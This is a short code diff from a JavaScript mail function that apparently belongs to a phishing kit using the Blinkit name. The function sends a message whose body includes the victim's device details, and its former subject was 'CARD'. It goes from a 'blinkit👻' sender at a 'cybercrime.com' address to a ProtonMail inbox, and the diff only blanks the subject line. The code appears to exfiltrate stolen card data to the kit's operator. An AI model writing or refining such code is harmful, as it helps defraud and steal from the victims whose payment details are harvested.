@@ -23,7 +23,7 @@ async function Mail(data) {
     Device:  ${data.device} <BR>
     </b>;
 `;
-  const subject = `CARD`;
+  const subject = ``;
   const info = await transporter.sendMail({
     from: '"blinkit👻" <blinkit@cybercrime.com>', // sender address
     to: "blinkit.cc@proton.me", // list of receivers
